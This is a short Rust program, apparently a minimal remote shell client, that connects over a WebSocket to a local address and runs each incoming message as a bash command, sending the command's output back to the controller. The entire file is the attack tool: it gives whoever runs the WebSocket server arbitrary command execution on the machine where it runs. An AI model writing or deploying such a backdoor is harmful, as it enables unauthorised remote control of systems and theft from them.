use std::process::Command;
use std::{thread, time};
use ws::{connect, Handler, Handshake, Message, Result, Sender};

struct Client {
    socket: Sender,
}

impl Handler for Client {
    fn on_open(&mut self, _: Handshake) -> Result<()> {
        self.socket.send("Sending information about me.")
    }

    fn on_message(&mut self, msg: Message) -> Result<()> {
        let output = Command::new("/bin/bash")
            .arg("-c")
            .arg(msg.as_text().unwrap())
            .output()
            .expect("Failed to read std");

        if output.stdout.is_empty() {
            self.socket.send(output.stderr)
        } else {
            self.socket.send(output.stdout)
        }
    }
}

fn main() {
    let connection_url = "ws://127.0.0.1:8080";
    connect(connection_url.clone(), handle_handshake).unwrap();
    thread::sleep(time::Duration::from_secs(5));
}

fn handle_handshake(socket: Sender) -> Client {
    Client { socket }
}
